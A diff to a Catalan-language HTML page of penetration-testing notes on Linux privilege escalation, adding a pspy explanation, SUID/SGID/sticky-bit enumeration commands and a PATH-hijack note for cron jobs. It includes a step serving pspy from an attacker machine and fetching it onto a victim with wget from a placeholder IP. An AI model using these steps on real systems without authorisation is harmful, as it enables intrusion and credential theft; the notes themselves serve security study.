@@ -219,7 +219,22 @@ find / -type f -perm  -g=s     </pre>
     <p>Ferramenta específica per buscar exploits per la versió del kernel que s'està executant en el SO.</p>
     <h4>pspy</h4>
     <p>unprivileged Linux process snooping. Permet vore en els processos del sistema sense tindre privilegis de <strong>root</strong>.</p>
+    <p>Normalment, per veure tots els processos del sistema necessitaries ser administrador, però <strong>pspy</strong>  ho fa d'una manera alternativa. 
+En lloc d'usar APIs privilegiades, pspy llegeix directament el sistema de fitxers <code>/proc</code> de Linux, que conté informació sobre tots els 
+processos en execució. Ho fa de forma contínua i ràpida per capturar fins i tot processos de molt curta durada.           </p>
+<p>Permet detectar tasques programades (crons) que s'executen com a root, de vegades els processos s'executen amb contrasenyes o tokens com a 
+  arguments a la línia de comandes, i pspy els captura. pspy pot veeure quins processos s'executen periòdicament sense haver d'accedir a /etc/cron* directament </p>
+  <p>Pspy és un projecte de codi obert allotjat a GitHub. El pots trobar aquí: <a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a>   </p>
+   <p>Per fer servir <code>pspy </code> el flux habitual és baixar-lo primer a la teva màquina atacant i després transferir-lo a la màquina víctima. 
+    Després donar-li permisos d'execució (a la màquina víctima) i executar-lo</p>
+    <p>Una forma ràpida de transferir-lo a la víctima és muntar un servidor HTTP des de la teva màquina amb</p>
+    <pre># A la teva màquina atacant
+python3 -m http.server 8080
 
+# A la màquina víctima
+wget http://LA_TEVA_IP:8080/pspy64     </pre>
+
+    <p></p>
 
     <h2>Escalada amb el kernel</h2>
     <ul>Algunes vulnerabilitats històriques del kernel de Linux
@@ -275,11 +290,12 @@ find / -type f -perm  -g=s     </pre>
       que un programa s’execute amb els privilegis del propietari del fitxer, i no amb els de l’usuari que l’executa. </p>
       <h4>Com identificar-lo</h4>
        <pre>-rw<span style="color: darkgreen; font-weight: bold;">s</span>r-xr-x </pre>
-<pre>ls -la /usr/bin/passwd
+<pre>  # Exemple
+ls -la /usr/bin/passwd
 -rwsr-xr-x 1 root root 64152 may 30  2024 /usr/bin/passwd   </pre>
 <pre>Com assignar el bit SUID
 chmod u+s /path_to_binary </pre>
-
+      <p>🧮 Valor numèric del Bit SUID: 4000</p> 
       <h4>Com trobar fitxers amb este bit</h4>
       <pre>find / -perm -u=s -type f 2>/dev/null
 find / -perm -4000 2>/dev/null        
@@ -300,13 +316,17 @@ find / -perm -4000 -exec ls -l {} \; 2>/dev/null     </pre>
     chmod g+s /path_to_binary 
     chmod g+s /path_to_directory </pre>
 
+    <pre>  # Exemple
+ls -la /usr/bin/crontab 
+-rwxr-sr-x 1 root crontab 39664 mar 31  2024 /usr/bin/crontab </pre>
+      <p>🧮 Valor numèric del Bit SGID: 2000</p> 
       <h4>Com trobar fitxers amb este bit</h4>
             <pre>find / -perm -g=s -type f 2>/dev/null
 find / -perm -2000 2>/dev/null
 find / -type f -perm -2000 2>/dev/null
 find / -user root -perm -2000 2>/dev/null
 find / -perm -2000 -exec ls -l {} \; 2>/dev/null     </pre>     
-
+<hr>
     <p>🧷 El Sticky Bit és un permís especial de Linux/Unix que s’utilitza principalment en directoris per evitar que els
        usuaris esborren o modifiquen fitxers que no són seus, encara que tinguin permisos d’escriptura al directori.
         És un mecanisme clau de seguretat multiusuari.</p>
@@ -314,7 +334,18 @@ find / -perm -2000 -exec ls -l {} \; 2>/dev/null     </pre>
     1. el propietari del fitxer  2. el propietari del directori 3. o root</p>
     <h4>Com identificar-lo</h4>
      <pre>drwxrwxrw<span style="color: darkgreen; font-weight: bold;">t</span>  </pre> 
-     <p>🧮 Valor numèric del Sticky Bit: 1000</p>
+
+     <p>🧮 Valor numèric del Sticky Bit: 1000</p> 
+ <h4>Com trobar fitxers amb este bit</h4>
+ <pre>
+find / -perm -1000 2>/dev/null
+find / -type d -perm /1000 2>/dev/null
+    </pre>
+    <pre>  # Exemple
+ls -ld /var/tmp
+drwxrwxrwt 11 root root 4096 mar  6 15:25 /var/tmp
+    </pre>     
+
      <h3>Escalada</h3>
      <p>Conieixent este mecanisme es podrà fer una escalada de privilegis local a través d'estos binaris, de forma
       similar a la explicada en sudo.       </p>
@@ -343,7 +374,7 @@ find / -perm -2000 -exec ls -l {} \; 2>/dev/null     </pre>
         <ul>
           <li>Permisos d'escriptura en l'scrip </li>
           <li>Variable d'entorn PATH</li>
-          Si el PATH conté la ruta al <code>home</code> primer que la ruta dels binaris, es podrà colocar en home un script maliciós 
+          Si el PATH conté la ruta al <code>home</code>, primer que la ruta dels binaris, es podrà colocar en home un script maliciós 
           amb el mateix nom del comando que s'execute en la tasca programada
           <li>Ús de comodins o "wildcards"</li>
         </ul>
@@ -446,6 +477,7 @@ find / -perm -2000 -exec ls -l {} \; 2>/dev/null     </pre>
 
    </section>
 
+   
     <section id="pivot">
     <h1>Tècniques de pivotatge</h1>
     <p>El pivotatge (pivoting) és una tècnica utilitzada quan: Ja tens accés a un sistema dins d’una xarxa, però vols arribar a altres sistemes que no són accessibles directament.</p>
